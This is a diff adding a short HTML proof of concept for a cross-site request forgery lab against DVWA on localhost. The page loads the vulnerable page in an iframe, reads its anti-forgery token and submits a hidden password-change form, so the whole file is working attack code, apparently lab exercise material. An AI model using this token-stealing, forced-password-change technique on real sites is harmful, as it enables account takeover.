@@ -1,0 +1,43 @@
+<!-- high_1.html -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Read token from iframe</title>
+</head>
+<body>
+    <!-- <iframe id="myIframe" src="http://localhost/DVWA/vulnerabilities/csrf/index.php" border="0" style="display: none;"></iframe> -->
+    <iframe id="myIframe" src="http://localhost/DVWA/vulnerabilities/csrf/index.php"></iframe>
+    <!-- <button onclick="readTokenFromIframe()">Read Token</button> -->
+
+    <script>
+        function readTokenFromIframe() {
+            var iframe = document.getElementById('myIframe');
+            // 在实际应用中，需要确保这里的 iframe 内容已经完全加载
+            if (iframe.contentDocument) {
+                var token = iframe.contentDocument.querySelector('input[name="user_token"]').value;
+                if (token) {
+                    console.log('user_token:', token);
+                    document.querySelector('input[name="user_token"]').value = token
+                }
+            }
+        }
+    </script>
+
+    <!-- 
+        GET /DVWA/vulnerabilities/csrf/index.php?
+        password_new=dddz
+        &password_conf=dddz
+        &Change=Change
+        &user_token=263e711deb360ae4e54c8fce3b6356bb 
+        HTTP/1.1 
+    -->
+    <form action="http://localhost/DVWA/vulnerabilities/csrf/index.php">
+        <input type="hidden" name="password_new" value="20250114."/>
+        <input type="hidden" name="password_conf" value="20250114."/>
+        <input type="hidden" name="Change" value="Change"/>
+        <input type="hidden" name="user_token" value=""/>
+        <input type="submit" value="Read Token Then CSRF Attack" onclick="readTokenFromIframe()"/>
+    </form>
+</body>
+</html>
